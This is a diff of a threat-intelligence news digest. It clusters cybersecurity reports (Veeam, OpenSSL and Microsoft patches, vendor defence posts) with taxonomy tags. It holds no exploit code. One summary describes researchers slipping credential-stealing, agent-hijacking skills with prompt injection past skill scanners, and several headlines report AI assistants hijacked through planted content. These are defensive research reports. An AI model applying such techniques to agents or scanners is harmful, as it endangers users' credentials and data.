+- Link: https://thehackernews.com/2026/06/veeam-backup-replication-rce-flaw-lets.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-44963
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, ransomware_extortion, supply_chain, zero_day
+- affected_products: Android, GitHub, Microsoft 365
+- cve_ids: CVE-2026-11645, CVE-2026-20230, CVE-2026-23479, CVE-2026-44963
+- urgency_signals: actively_exploited, no_patch_yet, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, supply_chain, zero_day, active_exploitation
+- affected_products: GitHub, Microsoft 365, Android
+- cve_ids: CVE-2026-44963, CVE-2026-11645, CVE-2026-20230, CVE-2026-23479
+- urgency_signals: actively_exploited, zero_day, no_patch_yet
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Veeam has released security patches to address a critical flaw in its Backup & Replication software that could result in remote code execution. Tracked as CVE-2026-44963, the vulnerability carries a CVSS score of 9.4 out of a maximum of 10.0. "A vulnerability allowing remote code execution (RCE) on the Backup Server by an authenticated domain user," Veeam said in a Tuesday advisory. It
+```
+
+#### Full body
+
+```
+Veeam Backup & Replication RCE Flaw Lets Domain Users Run Remote Code  Ravie Lakshmanan  Jun 09, 2026 Vulnerability / Backup Software Veeam has released security patches to address a critical flaw in its Backup & Replication software that could result in remote code execution. Tracked as CVE-2026-44963 , the vulnerability carries a CVSS score of 9.4 out of a maximum of 10.0. "A vulnerability allowing remote code execution (RCE) on the Backup Server by an authenticated domain user," Veeam said in a Tuesday advisory. It credited watchTowr researcher Sina Kheirkhah for responsibly discovering and reporting the issue. It impacts Veeam Backup & Replication 12.3.2.4465 and all earlier versions of 12 builds. Veeam has noted that the vulnerability does not affect any version 13.x build of the backup software due to architectural changes introduced in version 13. The shortcoming has been addressed in Veeam Backup & Replication version 12.3.2.4854. In March 2026, Veeam resolved multiple critical vulnerabilities in Backup & Replication software that, if successfully exploited, could result in remote code execution. It's essential that users update to the latest version for optimal version, particularly given that prior vulnerabilities in the program have been exploited by bad actors, including ransomware groups. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Backup software , cybersecurity , ransomware , remote code execution , Veeam , Vulnerability ⚡ Top Stories This Week Chrome V8 Zero-Day CVE-2026-11645 Exploited in the Wild - Patch Now New FROST Attack Lets Websites Track What Sites and Apps You Open via SSD Timing One-Character Linux Kernel Flaw Enables Local Root Access, Exploits Now Public ⚡ Weekly Recap: Instagram Account Hacks, Android Zero-Day, GitHub Worm and More New ChatGPT Lockdown Mode Limits Tools That Could Enable Data Exfiltration Free Apps Are Quietly Turning Smart TVs Into Web-Scraping Proxies for AI AI Agent Uncovers 21 Zero-Days in FFmpeg; Chrome Patches Record 429 Bugs Miasma Worm Hits 73 Microsoft GitHub Repositories in Major Supply Chain Attack Cisco Patches CVE-2026-20230 in Unified CM as Exploit Code Goes Public Claude Code GitHub Action Flaw Let One Malicious Issue Hijack Repositories Microsoft Fixes One-Click GitHub Dev Attack That Let Attackers Steal OAuth Tokens Autonomous AI Tool Finds 2-Year-Old RCE Flaw in Redis (CVE-2026-23479) Microsoft 365 Android Apps Let Any App Steal Account Tokens via Leftover Debug Flag Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes New HTTP/2 Bomb Vulnerability Allows Remote DoS on NGINX, Apache, IIS, Envoy and Cloudflare ThreatsDay Bulletin: AI Agents Gone Wrong, Sketchy C2 Tools, ClickFix Tricks, JS Backdoors + 20 New Stories ⭐ Featured Resources Get the 2026 Guide to Govern and Secure Enterprise AI Agents at Scale Catch 88% of Malware Threats in Under 60 Seconds with Live Sandbox Analysis [Guide] Transform Network Operations with Intelligent Workflows See How Agentic AI Cuts Your SOC Triage Time in Half [Get a Demo]
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Veeam Backup & Replication RCE Flaw Lets Domain Users Run Remote Code
+  - Published: 2026-06-09T16:39:47+00:00
+  - Link: https://thehackernews.com/2026/06/veeam-backup-replication-rce-flaw-lets.html
+  - Summary: Veeam has released security patches to address a critical flaw in its Backup & Replication software that could result in remote code execution. Tracked as CVE-2026-44963, the vulnerability carries a CVSS score of 9.4 out of a maximum of 10.0. "A vulnerability allowing remote code execution (RCE) on the Backup Server by an authenticated domain user," Veeam said in a Tuesday advisory. It
+
 ### Cluster ddb72e9e84 — score 10
 
 - Title: AI brands as bait: How threat actors are using the AI hype in social engineering
-- Source: Microsoft Threat Intelligence (threat_research_primary)
+- Source: Microsoft Security Blog (threat_research_primary)
 - Published: 2026-06-08T16:00:00+00:00
 - Link: https://www.microsoft.com/en-us/security/blog/2026/06/08/ai-brands-as-bait-how-threat-actors-are-using-the-ai-hype-in-social-engineering/
 - Fetch status: ok
@@ -2677,12 +2781,12 @@ Share Link copied to clipboard! Tags Adversary-in-the-middle (AiTM) Credential t
 
 #### Corroborating sources (2)
 
-- **Microsoft Threat Intelligence** (threat_research_primary)
+- **Microsoft Security Blog** (threat_research_primary)
   - Title: AI brands as bait: How threat actors are using the AI hype in social engineering
   - Published: 2026-06-08T16:00:00+00:00
   - Link: https://www.microsoft.com/en-us/security/blog/2026/06/08/ai-brands-as-bait-how-threat-actors-are-using-the-ai-hype-in-social-engineering/
   - Summary: As threat actors operationalize AI to accelerate attacks, they are also leveraging the wider global interest around AI itself as a social engineering lure. The post AI brands as bait: How threat actors are using the AI hype in social engineering appeared first on Microsoft Security Blog .
-- **Microsoft Security Blog** (threat_research_primary)
+- **Microsoft Threat Intelligence** (threat_research_primary)
   - Title: AI brands as bait: How threat actors are using the AI hype in social engineering
   - Published: 2026-06-08T16:00:00+00:00
   - Link: https://www.microsoft.com/en-us/security/blog/2026/06/08/ai-brands-as-bait-how-threat-actors-are-using-the-ai-hype-in-social-engineering/
@@ -2856,47 +2960,6 @@ Kids Online Lessons for life: Why children’s data is a long-term identity risk
   - Link: https://www.welivesecurity.com/en/kids-online/lessons-life-childrens-data-long-term-identity-risk/
   - Summary: Your child’s first data breach may happen before they’ve even opened a bank account. Here’s how to keep their digital life safe.
 
-### Cluster 1f5463ba47 — score 10
-
-- Title: Horizon3.ai and Brinqa Partner to Help Enterprises Prioritize Real-World Cyber Exposure
-- Source: Horizon3 Attack Research (offensive_vulnerability_research)
-- Published: 2026-06-03T13:10:00+00:00
-- Link: https://horizon3.ai/news/press-release/horizon3-ai-brinqa-partnership/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-Horizon3.ai and Brinqa announced a strategic partnership that combines attack-path validation, exposure intelligence, and remediation orchestration to help organizations prioritize and reduce real-world cyber risk.
-```
-
-#### Full body
-
-```
-Horizon3.ai and Brinqa Partner to Help Enterprises Prioritize Real-World Cyber Exposure Business Wire June 3, 2026 Press Releases SAN FRANCISCO and AUSTIN, Texas — June 3, 2026 — Horizon3.ai, the AI-native proactive security leader, and Brinqa, a leader in AI-powered exposure management, today announced a strategic technology partnership designed to help enterprises operationalize Continuous Threat Exposure Management (CTEM), strengthen risk-based vulnerability management (RBVM) programs, and advance Adversarial Exposure Validation (AEV) initiatives through validated, attacker-informed exposure intelligence. The partnership brings together Horizon3.ai’s NodeZero® AI-native Proactive Security Platform and the Brinqa Exposure Management platform to help organizations prioritize and reduce the exposures most likely to lead to ransomware, operational disruption, and data compromise. As enterprise attack surfaces continue to expand across cloud, hybrid, and on-premises environments, security teams are overwhelmed by disconnected findings, duplicate alerts, and severity-based prioritization models that often fail to distinguish between theoretical findings and exposures that create meaningful business risk. By integrating Horizon3.ai’s attack path intelligence and autonomous pentesting insights with Brinqa’s AI-powered exposure correlation and remediation orchestration capabilities, organizations can focus remediation efforts on the exposures attackers can actually exploit. “Attackers do not think in CVEs or isolated findings. They think in objectives, attack paths, and business impact,” said Snehal Antani, CEO and co-founder of Horizon3.ai. “NodeZero continuously uncovers exploitable attack paths and shows how attackers can move through complex environments. By integrating that intelligence into Brinqa’s exposure management platform, organizations can validate real-world exposure, prioritize what matters most, and reduce risk based on what attackers can actually exploit instead of assumptions.” NodeZero delivers continuous adversarial exposure validation by uncovering exploitable weaknesses, credential exposures, privilege escalation risks, and chained attack paths across enterprise environments. Horizon3.ai’s Threat Actor Intelligence and Vulnerability Risk Intelligence capabilities further enrich prioritization by helping organizations understand which exposures create the greatest operational and business risk. Brinqa ingests and correlates those insights with asset intelligence, business context, threat data, ownership attribution, and remediation workflows through its CyberRisk Graph™ to help organizations continuously prioritize, mobilize, and measure exposure reduction efforts across security, infrastructure, cloud, and application teams. Together, the companies help organizations: Prioritize vulnerabilities and exposures based on validated exploitability, attack paths, and business impact Enable attack-path-informed prioritization and remediation across complex enterprise environments Reduce remediation noise by focusing teams on exposures most likely to be targeted by attackers Correlate offensive security insights with enterprise exposure and operational context Improve remediation coordination and ownership attribution across distributed environments Operationalize CTEM, RBVM, and AEV initiatives with greater visibility and measurable progress Continuously validate whether remediation efforts are effectively reducing real-world exposure “The path to compromise is rarely a single critical vulnerability. It’s a chain of low severity findings that no scanner would flag as a priority on its own,” said Dan Pagel, CEO at Brinqa. “Horizon3.ai shows defenders the path. Brinqa prioritizes what matters, with full business context, and automates the fix. That’s the decision and automation plane exposure management has been missing.” The partnership reflects growing enterprise demand for exposure management strategies that move beyo
-```
-
-#### Corroborating sources (1)
-
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - Title: Horizon3.ai and Brinqa Partner to Help Enterprises Prioritize Real-World Cyber Exposure
-  - Published: 2026-06-03T13:10:00+00:00
-  - Link: https://horizon3.ai/news/press-release/horizon3-ai-brinqa-partnership/
-  - Summary: Horizon3.ai and Brinqa announced a strategic partnership that combines attack-path validation, exposure intelligence, and remediation orchestration to help organizations prioritize and reduce real-world cyber risk.
-
 ### Cluster 15d2915b57 — score 10
 
 - Title: VerdantBamboo: Just Another BRICKSTORM in the Firewall
@@ -2941,6 +3004,47 @@ Threat Intelligence VerdantBamboo: Just Another BRICKSTORM in the Firewall June 
   - Published: 2026-06-04T20:23:55+00:00
   - Link: https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/
   - Summary: In September 2025, Volexity conducted an incident response engagement that began after suspicious network traffic was observed from a Linux-based virtual machine appliance on a customer’s network. The virtual machine […] The post VerdantBamboo: Just Another BRICKSTORM in the Firewall appeared first on Volexity .
+
+### Cluster 1f5463ba47 — score 10
+
+- Title: Horizon3.ai and Brinqa Partner to Help Enterprises Prioritize Real-World Cyber Exposure
+- Source: Horizon3 Attack Research (offensive_vulnerability_research)
+- Published: 2026-06-03T13:10:00+00:00
+- Link: https://horizon3.ai/news/press-release/horizon3-ai-brinqa-partnership/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+Horizon3.ai and Brinqa announced a strategic partnership that combines attack-path validation, exposure intelligence, and remediation orchestration to help organizations prioritize and reduce real-world cyber risk.
+```
+
+#### Full body
+
+```
+Horizon3.ai and Brinqa Partner to Help Enterprises Prioritize Real-World Cyber Exposure Business Wire June 3, 2026 Press Releases SAN FRANCISCO and AUSTIN, Texas — June 3, 2026 — Horizon3.ai, the AI-native proactive security leader, and Brinqa, a leader in AI-powered exposure management, today announced a strategic technology partnership designed to help enterprises operationalize Continuous Threat Exposure Management (CTEM), strengthen risk-based vulnerability management (RBVM) programs, and advance Adversarial Exposure Validation (AEV) initiatives through validated, attacker-informed exposure intelligence. The partnership brings together Horizon3.ai’s NodeZero® AI-native Proactive Security Platform and the Brinqa Exposure Management platform to help organizations prioritize and reduce the exposures most likely to lead to ransomware, operational disruption, and data compromise. As enterprise attack surfaces continue to expand across cloud, hybrid, and on-premises environments, security teams are overwhelmed by disconnected findings, duplicate alerts, and severity-based prioritization models that often fail to distinguish between theoretical findings and exposures that create meaningful business risk. By integrating Horizon3.ai’s attack path intelligence and autonomous pentesting insights with Brinqa’s AI-powered exposure correlation and remediation orchestration capabilities, organizations can focus remediation efforts on the exposures attackers can actually exploit. “Attackers do not think in CVEs or isolated findings. They think in objectives, attack paths, and business impact,” said Snehal Antani, CEO and co-founder of Horizon3.ai. “NodeZero continuously uncovers exploitable attack paths and shows how attackers can move through complex environments. By integrating that intelligence into Brinqa’s exposure management platform, organizations can validate real-world exposure, prioritize what matters most, and reduce risk based on what attackers can actually exploit instead of assumptions.” NodeZero delivers continuous adversarial exposure validation by uncovering exploitable weaknesses, credential exposures, privilege escalation risks, and chained attack paths across enterprise environments. Horizon3.ai’s Threat Actor Intelligence and Vulnerability Risk Intelligence capabilities further enrich prioritization by helping organizations understand which exposures create the greatest operational and business risk. Brinqa ingests and correlates those insights with asset intelligence, business context, threat data, ownership attribution, and remediation workflows through its CyberRisk Graph™ to help organizations continuously prioritize, mobilize, and measure exposure reduction efforts across security, infrastructure, cloud, and application teams. Together, the companies help organizations: Prioritize vulnerabilities and exposures based on validated exploitability, attack paths, and business impact Enable attack-path-informed prioritization and remediation across complex enterprise environments Reduce remediation noise by focusing teams on exposures most likely to be targeted by attackers Correlate offensive security insights with enterprise exposure and operational context Improve remediation coordination and ownership attribution across distributed environments Operationalize CTEM, RBVM, and AEV initiatives with greater visibility and measurable progress Continuously validate whether remediation efforts are effectively reducing real-world exposure “The path to compromise is rarely a single critical vulnerability. It’s a chain of low severity findings that no scanner would flag as a priority on its own,” said Dan Pagel, CEO at Brinqa. “Horizon3.ai shows defenders the path. Brinqa prioritizes what matters, with full business context, and automates the fix. That’s the decision and automation plane exposure management has been missing.” The partnership reflects growing enterprise demand for exposure management strategies that move beyo
+```
+
+#### Corroborating sources (1)
+
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - Title: Horizon3.ai and Brinqa Partner to Help Enterprises Prioritize Real-World Cyber Exposure
+  - Published: 2026-06-03T13:10:00+00:00
+  - Link: https://horizon3.ai/news/press-release/horizon3-ai-brinqa-partnership/
+  - Summary: Horizon3.ai and Brinqa announced a strategic partnership that combines attack-path validation, exposure intelligence, and remediation orchestration to help organizations prioritize and reduce real-world cyber risk.
 
 ### Cluster 7c6c399f7e — score 10
 
@@ -3151,6 +3255,53 @@ Page content Public skill marketplaces are being flooded with malicious skills t
   - Link: https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/
   - Summary: Public skill marketplaces are being flooded with malicious skills that steal credentials, exfiltrate data, and hijack agents. In response, a segment of the security industry released skill scanners, a new family of tools designed to detect malicious skills before they’re installed. But we tested them, and they don’t work. We recently bypassed ClawHub’s malicious skill detector , Cisco’s agent skill scanner , and all three of the scanners integrated into skills.sh . These were not advanced attacks: it took us less than an hour to conceive and implement three of the four malicious skills in trailofbits/overtly-malicious-skills , using standard tricks and rapid inspection of the scanner source code. The fourth malicious skill took a few hours, but only because the prompt injection required some trial and error. Our findings demonstrate that even when skill scanners have some defenses, their static nature gives an adversary unlimited bites at the apple to tweak an attack until it finds a w
 
+### Cluster 84e90fe8a7 — score 10
+
+- Title: Microsoft June 2026 Patch Tuesday fixes 3 zero-day, 200 flaws
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-06-09T17:57:59+00:00
+- Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-june-2026-patch-tuesday-fixes-3-zero-day-200-flaws/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, ddos, zero_day
+- affected_products: Microsoft BitLocker, Microsoft Windows
+- cve_ids: CVE-2026-45586, CVE-2026-49160, CVE-2026-50507
+- urgency_signals: actively_exploited, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day, ddos, active_exploitation
+- affected_products: Microsoft BitLocker, Microsoft Windows
+- cve_ids: CVE-2026-45586, CVE-2026-49160, CVE-2026-50507
+- urgency_signals: actively_exploited, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Today is Microsoft's June 2026 Patch Tuesday, with security updates for 200 flaws and three publicly disclosed zero-day vulnerabilities. [...]
+```
+
+#### Full body
+
+```
+Microsoft June 2026 Patch Tuesday fixes 3 zero-day, 200 flaws By Lawrence Abrams June 9, 2026 01:57 PM 0 Today is Microsoft's June 2026 Patch Tuesday, with security updates for 200 flaws and three publicly disclosed zero-day vulnerabilities. This Patch Tuesday addresses 33 "Critical" vulnerabilities, 28 of which are remote code execution, 4 are elevation of privilege, and 1 is an information disclosure flaw. The number of bugs in each vulnerability category is listed below: 65 Elevation of Privilege Vulnerabilities 19 Security Feature Bypass Vulnerabilities 55 Remote Code Execution Vulnerabilities 30 Information Disclosure Vulnerabilities 7 Denial of Service Vulnerabilities 27 Spoofing Vulnerabilities When BleepingComputer reports on Patch Tuesday security updates, we only count those released by Microsoft today. Therefore, the number of flaws does not include flaws in Mariner, Azure HorizonDB, Microsoft Copilot, Copilot Chat, M365 Copilot, Microsoft Exchange Online, and Microsoft Graph that were fixed by Microsoft earlier this month. There were also a massive 360 Microsoft Edge/Chromium flaws that were fixed by Google this month, which were excluded from this Patch Tuesday roundup. To learn more about the non-security updates released today, you can review our dedicated articles on the Windows 11 KB5094126 & KB5093998 cumulative updates and the Windows 10 KB5094127 extended security update . Noteworthy vulnerabilities This month's Patch Tuesday fixes three publicly disclosed zero-day vulnerabilities, none of which are known to have been exploited in attacks. Microsoft classifies a zero-day flaw as publicly disclosed or actively exploited while no official fix is available. The two publicly disclosed zero-days are: CVE-2026-45586 - Windows Collaborative Translation Framework (CTFMON) Elevation of Privilege Vulnerability Microsoft has patched a publicly disclosed Windows CTFMON vulnerability that grants SYSTEM privileges. "Improper link resolution before file access ('link following') in Windows Collaborative Translation Framework allows an authorized attacker to elevate privileges locally," explains Microsoft. Microsoft has credited the flaw to an anonymous researcher, but has not shared any details on how it was disclosed. CVE-2026-49160 - HTTP.sys Denial of Service Vulnerability Microsoft has patched a publicly disclosed HTTP/2 denial of service flaw called " HTTP/2 Bomb " that was disclosed this month by researchers at the offensive security firm Calif. "Uncontrolled resource consumption in HTTP/2 allows an unauthorized attacker to deny service over a network," explains Microsoft. The HTTP/2 Bomb attack is a denial-of-service technique that abuses how the HTTP/2 protocol compresses and manages web traffic headers, allowing attackers to send very small amounts of data that force servers to allocate disproportionately large amounts of memory. Researchers found the attack could dramatically increase memory usage on affected servers. Attackers can also keep the memory tied up by manipulating flow-control settings, preventing the server from freeing resources and potentially causing performance issues or outages. To help mitigate this attack, Microsoft has introduced a new "MaxHeadersCount" registry setting to limit the number of headers in a request, along with a support bulletin on how to use it. "Microsoft also introduced a new MaxHeadersCount registry setting. This setting allows you to limit the number of headers included in HTTP/2 and HTTP/3 requests that are accepted by the HTTP server. For more information, see KB5102602," continued Microsoft. This flaw was attributed to Quang Luong and Codex of Calif.io. CVE-2026-50507 - Windows BitLocker Security Feature Bypass Vulnerability Microsoft has patched a publicly disclosed Windows BitLocker bypass flaw that allowed local attackers to gain access to an encrypted drive. "Protection mechanism failure in Windows BitLocker allows an unauthorized attacker to bypass a security feat
+```
+
+#### Corroborating sources (1)
+
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Microsoft June 2026 Patch Tuesday fixes 3 zero-day, 200 flaws
+  - Published: 2026-06-09T17:57:59+00:00
+  - Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-june-2026-patch-tuesday-fixes-3-zero-day-200-flaws/
+  - Summary: Today is Microsoft's June 2026 Patch Tuesday, with security updates for 200 flaws and three publicly disclosed zero-day vulnerabilities. [...]
+
 ### Cluster dd945df79d — score 10
 
 - Title: CISA gives feds 3 days to patch Check Point VPN bug exploited as zero-day
@@ -3199,6 +3350,57 @@ CISA gives feds 3 days to patch Check Point VPN bug exploited as zero-day By Ser
   - Published: 2026-06-09T08:18:39+00:00
   - Link: https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-check-point-flaw-exploited-by-ransomware-gangs/
   - Summary: CISA has ordered U.S. government agencies to secure their Check Point Remote Access VPN and Mobile Access deployments against a critical vulnerability exploited in zero-day attacks by Qilin ransomware affiliates. [...]
+
+### Cluster bf85d8cffa — score 10
+
+- Title: OpenSSL Patches High-Severity Vulnerability Found With AI
+- Source: SecurityWeek (cyber_news_breach_reporting)
+- Published: 2026-06-09T16:47:58+00:00
+- Link: https://www.securityweek.com/openssl-patches-high-severity-vulnerability-found-with-ai/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, supply_chain, zero_day
+- affected_industries: manufacturing_industrial
+- affected_products: Anthropic/Claude, Drupal, Google/Gemini
+- tools_used: PyPI, npm
+- cve_ids: CVE-2026-45447
+- urgency_signals: zero_day
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, zero_day, data_breach
+- affected_industries: manufacturing_industrial
+- affected_products: Anthropic/Claude, Drupal, Google/Gemini
+- tools_used: npm, PyPI
+- cve_ids: CVE-2026-45447
+- urgency_signals: zero_day
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+A total of 18 vulnerabilities have been patched in the latest OpenSSL releases, including many that were potentially discovered by AI. The post OpenSSL Patches High-Severity Vulnerability Found With AI appeared first on SecurityWeek .
+```
+
+#### Full body
+
+```
+The latest OpenSSL releases patch 18 vulnerabilities, including a high-severity issue that could allow remote code execution. The high-severity vulnerability, tracked as CVE-2026-45447, is a heap user-after-free bug in a function used for PKCS#7 (Public-Key Cryptography Standard #7) verification. Discovered by a Calif researcher in collaboration with Claude AI and Anthropic Research, the bug can be triggered using a specially crafted PKCS#7 or S/MIME signed message during PKCS#7 signature verification. “When processing a PKCS#7 or S/MIME signed message, if the SignedData digestAlgorithms field is present as an empty ASN.1 SET, OpenSSL may incorrectly free a caller-owned BIO during PKCS7_verify(). A subsequent use of the BIO by the calling application results in a use-after-free condition,” OpenSSL developers explained . Exploitation of the vulnerability can result in heap corruption, process crashes, and possibly in remote code execution. The moderate-severity flaws patched in OpenSSL can be exploited to decrypt encrypted communications, forge arbitrary ciphertexts, launch DoS attacks, bypass integrity validation, and execute arbitrary code. Advertisement. Scroll to continue reading. One of the medium-severity weaknesses can be exploited to trick a system into accepting a fake, attacker-controlled certificate and private key, allowing the attacker to bypass authentication mechanisms with a 1-in-256 success rate. The low-severity vulnerabilities can lead to crashes (DoS), message forgery, recovery of private keys, replacement of root CA certificates, and possibly arbitrary code execution. Alex Gaynor of Anthropic has been credited with reporting half a dozen of the newly patched vulnerabilities, suggesting that the AI giant’s Mythos model may have helped identify the flaws. High-severity vulnerabilities in OpenSSL are rare these days. Only one high-severity issue was patched last year, and CVE-2026-45447 is the second high-severity flaw of 2026 . In April, OpenSSL developers patched a flaw that can allow an attacker to obtain sensitive data . Related : Drupal Patches Highly Critical Vulnerability Exposing Websites to Hacking Related : Google Patches 5th Chrome Zero-Day Exploited in 2026 Related : Android Update Patches Exploited Zero-Day, 123 Other Vulnerabilities Related : Oracle’s First Monthly Patches Resolve 77 Vulnerabilities Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Google Patches 5th Chrome Zero-Day Exploited in 2026 WhatsApp Catches Spyware Firm NSO Defying No-Hacking Court Order Cybersecurity M&A Roundup: 26 Deals Announced in May 2026 OpenAI Rolling Out ChatGPT Account Security Controls Meta Says 20,000 Instagram Accounts Hacked via AI Tool Abuse Nightclub Giant RCI Says Data Breach Affects 40,000 Individuals Cisco Warns of 7th SD-WAN Zero-Day Exploited in 2026 Gemini Voice Assistant Hijacked via Messaging Notifications Latest News Microsoft Patches 200 Vulnerabilities Adobe Patches 123 Vulnerabilities Anthropic Launches Claude Fable 5: Mythos-Class AI With Cybersecurity Guardrails Claude Mythos Turns N-Days Into N-Hours With Rapid Exploit Creation New Platform Uses Cryptographic Invisibility to Protect AI-Built Applications SAP Patches Critical NetWeaver, Commerce Vulnerabilities Over 100 NPM, PyPI Packages Hit in New Shai-Hulud Supply Chain Attacks Will AI Kill the Bug Bounty Industry? Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. We
+```
+
+#### Corroborating sources (1)
+
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: OpenSSL Patches High-Severity Vulnerability Found With AI
+  - Published: 2026-06-09T16:47:58+00:00
+  - Link: https://www.securityweek.com/openssl-patches-high-severity-vulnerability-found-with-ai/
+  - Summary: A total of 18 vulnerabilities have been patched in the latest OpenSSL releases, including many that were potentially discovered by AI. The post OpenSSL Patches High-Severity Vulnerability Found With AI appeared first on SecurityWeek .
 
 ### Cluster b7b0b1454f — score 10
 
@@ -3386,44 +3588,89 @@ Blog How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Pe
   - Link: https://trustedsec.com/blog/how-to-train-your-dragons-analysts
   - Summary: <p>Whether it be the advent of AI technologies, new Red-Team techniques and exploits, or new patches and emergent defensive technologies, it’s pretty clear to all of us operating within technology fields that the landscape…</p>
 
-### Cluster 3475095520 — score 9
+### Cluster a3b5c4afdc — score 9
 
-- Title: Defend against frontier cyber models: Cloudflare's architecture as customer zero
-- Source: Cloudflare Security (cloud_identity_infrastructure)
-- Published: 2026-06-09T06:00:00+00:00
-- Link: https://blog.cloudflare.com/frontier-model-defense/
+- Title: Detecting and containing AI-powered threats with Google Security Operations agents
+- Source: Google Cloud Security (cloud_identity_infrastructure)
+- Published: 2026-06-09T16:00:00+00:00
+- Link: https://cloud.google.com/blog/products/identity-security/detecting-and-containing-powered-threats-with-google-security-operations-agents/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- content_type: threat_research
+- threat_categories: data_breach
+- urgency_signals: no_patch_yet
+- content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- content_type: threat_research
+- threat_categories: data_breach
+- urgency_signals: no_patch_yet
+- content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-In our post about Project Glasswing, we made the argument that the architecture around a vulnerability matters more than the speed of the patch. Here we walk through what that architecture looks like, the threats it defends against, and how we run it ourselves as Cloudflare's customer zero.
+To defend against the growing range of AI-accelerated threat actors, organizations need to be able to respond faster to outpace the adversary. Recently, we announced Google AI Threat Defense , an automated security system designed to help you continuously monitor for and stop AI-powered threats before they can impact your business. Based on Google’s own approach to today’s threats and vulnerability management, it’s centered on a four-step framework: Prepare, scan and prioritize, remediate, and monitor. Today, we’re sharing more details on how Google Security Operations works in concert with AI Threat Defense to monitor, detect, and respond to threats, particularly from code you do not own or can not patch. The remediation gap represents a critical vulnerability. According to M-Trends 2026 , the exploitation of vulnerabilities has become the most common initial infection vector. Notably, the report also indicates that the mean time to exploit has dropped to an estimated minus seven days
 ```
 
 #### Full body
 
 ```
-Defend against frontier cyber models: Cloudflare's architecture as customer zero 2026-06-09 Rohit Chenna Reddy Chase Catelli Dan Jones 8 min read A few weeks ago, we wrote about Project Glasswing and what we observed when we pointed cyber frontier models at our own code. Since then, weâve seen that the part of the post that has resonated most deeply is the argument that the architecture around the vulnerability matters more than the speed of the patch. In the conversations we've had with CISOs and security teams since, the questions have been consistent: what does our architecture actually look like, what should we monitor for, where do we start, and how can Cloudflare help? Before getting into the details: the architecture below is built almost entirely from Cloudflare's own products, because Cloudflare security is customer zero for the security products we build. The Cloudflare stack already exists in front of our code, employees, and customer-facing applications. If you're a Cloudflare customer, every layer below is available to you today. If you're not, the principles still apply to whatever stack you've built. What a cyber frontier model actually changes In the previous post , we showed how a cyber frontier model like Mythos changes the attackerâs timeline. It can find vulnerabilities, reason through exploit chains, and generate working proofs faster than earlier models. While models like Mythos do not change the shape of an intrusion â reconnaissance, initial access, lateral movement, persistence, and exfiltration still have to happen â the difference is in the speed and scale. When pointed at the open web, a model can find and hit low-hanging fruit quickly. Against a hardened target, it still has to probe, and adapt, and it often produces more noise than a careful human operator would. Discovery, exploit chain construction, and proof-of-concept generation used to be the gating constraints on producing a working attack. A frontier model handles all three in a fraction of the time. Work that used to be slow and methodical is now fast and indiscriminate. While AI is accelerating how fast developer teams at Cloudflare and many other companies can ship code, the security teamâs work has not compressed the same way. An attacker only needs one opening to get in, while security teams need to find and close them all. Writing a fix, regressing it, and shipping it without breaking the code around it has constraints that AI doesn't remove. We learned this the hard way when we let an AI coding assistant write its own patches against our own bugs, as we described at the end of the previous post . Some of those patches fixed the original bug while quietly breaking something else the code depended on. As these models become more competent and capable, our main focus from a threat standpoint comes down to three things. Each one shapes the architecture we walk through in the rest of this post. The first is the 